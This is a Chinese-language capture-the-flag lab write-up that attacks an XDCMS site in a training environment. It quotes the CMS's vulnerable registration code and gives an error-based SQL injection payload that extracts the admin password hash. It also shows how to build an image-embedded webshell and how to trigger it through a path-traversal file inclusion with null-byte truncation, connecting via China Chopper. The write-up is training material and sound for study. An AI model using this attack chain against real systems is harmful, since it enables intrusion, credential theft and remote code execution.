# 【i春秋】渗透测试入门 —— 你是会员吗？

<div class="has-toc have-toc">
</div>

## 0x00 前言

题目链接：<a rel="noreferrer noopener" href="https://www.ichunqiu.com/battalion?t=2&r=54399" target="_blank" rel="nofollow" >https://www.ichunqiu.com/battalion?t=2&r=54399</a>

实验环境

  * 操作机：`Windows XP`

实验工具：

  * `<code>BURP`</code>
  * `中国菜刀`

实验任务：

  * 本次实验要求获取www.test.ichunqiu网站的FLAG信息。

实验试题:

  * 第1题：获取ww.test.ichunqiu后台登录密码。
  * 第2题：获取目标网站目录中的flag文件信息。

## 0x01 管理员密码

首先打开网页

<div class="wp-block-image">
  <figure class="aligncenter size-large"><img loading="lazy" width="1280" height="770" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/01/图片-56.png" alt="" class="wp-image-301" /></figure>
</div>
能够观察到网站是XDCMS，寻找相关漏洞，根据题目中的“会员”、“SQLMAP”等关键词，查找发现在XDCMS企业管理系统的注册功能处存在SQL注入漏洞，index.php的register_save函数处。

```php
public function register_save(){ 

$username=safe_html($_POST['username']);//获取UserName，这里用safe_html函数进行过滤 

$password=$_POST['password']; 

$password2=$_POST['password2']; 

$fields=$_POST['fields']; 

if(empty($username)||empty($password2)||empty($password)){ 
showmsg(C('material_not_complete'),'-1');   
} 

if(!strlength($username,5)){  
showmsg(C('username').C('str_len_error').'5','-1'); 
} 

if(!strlength($password,5)){ 
showmsg(C('password').C('str_len_error').'5','-1'); 
} 

if($password!=$password2){ 
showmsg(C('password_different'),'-1'); 
} 

$password=md5(md5($password)); 

$user_num=$this->mysql->num_rows("select * from ".DB_PRE."member where `username`='$username'");//判断会员是否存在，这里的UserName可被绕过过滤，导致注入，这是第一处SQL注入 

if($user_num>0){ 
showmsg(C('member_exist'),'-1'); 
} 

$ip=safe_replace(safe_html(getip())); 

$this->mysql->db_insert('member',"`username`='".$username."',`password`='".$password."',`creat_time`='".datetime()."',`last_ip`='".$ip."',`is_lock`='0',`logins`='0',`groupid`='1'");//插入主要字段——用户名、密码，这里的UserName同样造成注入，第二处sql注入 

$last_id=$this->mysql->insert_id(); //插入附属字段 

$field_sql=''; 

foreach($fields as $k=>$v){ 
$f_value=$v; 

if(is_array($v)){ 
$f_value=implode(',',$v); 
} 

$field_sql.=",`{$k}`='{$f_value}'";//这里没有过滤，直接进入了下面的update sql语句，导致第三处sql注入 

} 

$field_sql=substr($field_sql,1); 

$field_sql="update ".DB_PRE."member set {$field_sql} where userid={$last_id}"; 

$query=$this->mysql->query($field_sql); 

showmsg(C('register_success'),'index.php?m=member&f=register'); 

}
```

开始设置Burp的代理。

<div class="wp-block-image">
  <figure class="aligncenter size-large is-resized"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/01/图片-57.png" alt="" class="wp-image-307" width="385" height="164" /></figure>
</div>

注册新用户

<div class="wp-block-image">
  <figure class="aligncenter size-large is-resized"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/01/图片-58.png" alt="" class="wp-image-309" width="688" height="158" /></figure>
</div>
在登录页面，UserName后插入下方EXP

```
' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14 FROM (SELECT count(1),concat(round(rand(0)),(SELECT concat(username,0x23,password) FROM c_admin LIMIT 0,1))a FROM information_schema.tables GROUP by a)b#'
```

<div class="wp-block-image">
  <figure class="aligncenter size-large is-resized"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/01/图片-59.png" alt="" class="wp-image-312" width="646" height="176" /></figure>
</div>

Forward后，页面蹦出用户名`xdcms121`和一串MD5值，解密后得到`xdcms212`

<div class="wp-block-image">
  <figure class="aligncenter size-large is-resized"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/01/图片-61.png" alt="" class="wp-image-315" width="794" height="52" /></figure>
</div>

## 0x02 flag文件信息

在登录页面无法以管理员身份登录，猜测有管理员页面，开御剑扫一下后台目录。“啪”的一下，很快啊，发现了几个带admin的路径。

<div class="wp-block-image">
  <figure class="aligncenter size-large is-resized"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/01/图片-62.png" alt="" class="wp-image-321" width="559" height="104" /></figure>
</div>

成功进入后台。

<div class="wp-block-image">
  <figure class="aligncenter size-large"><img loading="lazy" width="1272" height="726" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/01/图片-63.png" alt="" class="wp-image-323" /></figure>
</div>

构建图片马`Copy Sunset.jpg/b+ muma.txt/aresult.jpg /y`

<div class="wp-block-image">
  <figure class="aligncenter size-large is-resized"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/01/图片-70.png" alt="" class="wp-image-343" width="482" height="377" /></figure>
</div>

<div class="wp-block-image">
  <figure class="aligncenter size-large"><img loading="lazy" width="1255" height="123" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/01/图片-65.png" alt="" class="wp-image-333" /></figure>
</div>

找到文件上传点，但图片无法正常上传，借鉴其他师傅的经验，在图片栏输入图片的绝对路径。

<div class="wp-block-image">
  <figure class="aligncenter size-large is-resized"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/01/图片-67.png" alt="" class="wp-image-338" width="358" height="160" /></figure>
</div>

上传后打开Burp，**Proxy -> History** 中点击相应记录，并在 **Response -> Raw** 中看到图片马的地址为/uploadfile/image/20210121/202101210957560.jpg。<figure class="wp-block-image size-large">

<img loading="lazy" width="1299" height="125" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/01/图片-68.png" alt="" class="wp-image-340" /> </figure> 

利用 URL 查询字符串的 `m` 参数指向图片马的路径，最终触发文件包含漏洞，关键语句如下：

<pre class="wp-block-code"><code>include MOD_PATH.$m."/".$c.".php"; //调用类</code></pre>

因此使用菜刀 添加SHELL 时，赋值给 `m` 的图片马路径需要先从 `MOD_PATH` 返回根目录，拟在前面添加 `../../`，猜测向上返回两级目录后可到达根目录，若猜测正确即能指向图片马的路径。http://www.test.ichunqiu/index.php?m=../../uploadfile/image/20210121/202101210957560.jpg，选择php。

结果弹出报错信息，这里是因为参数 `m` 被引用到源码后，后面还连了一段字符串，该字符串默认情况下是 `/index.php`，在参数 `m` 末尾加入空字符 `%00`，对源码中的 `include` 语句进行截断。<figure class="wp-block-image size-large">

<img loading="lazy" width="1026" height="345" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/01/图片-69.png" alt="" class="wp-image-341" /> </figure> 

成功连接，打开flag文件，成功得到`key{7h7hii9a}`
